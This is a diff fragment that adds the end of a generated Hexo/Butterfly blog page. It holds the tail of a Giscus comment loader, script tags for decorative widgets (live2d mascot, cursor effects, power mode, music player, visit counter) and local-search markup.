+      if (!iframe) return
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app')
+    }
+
+    sendMessage({
+      setConfig: {
+        theme: getGiscusTheme(theme)
+      }
+    });
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment= loadGiscus
+  }
+})()</script></div><script src="https://fastly.jsdelivr.net/gh/0x5h1n0k0/live2d-hexo@latest/autoload.js"></script><script src="https://0x5h1n0k0.github.io/assets/javascripts/cursor-effects.js"></script><script id="canvas_nest" defer="defer" color="187, 134, 252" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/2/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start -->
+<script src="/2/js/collapse.js"></script>
+<script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
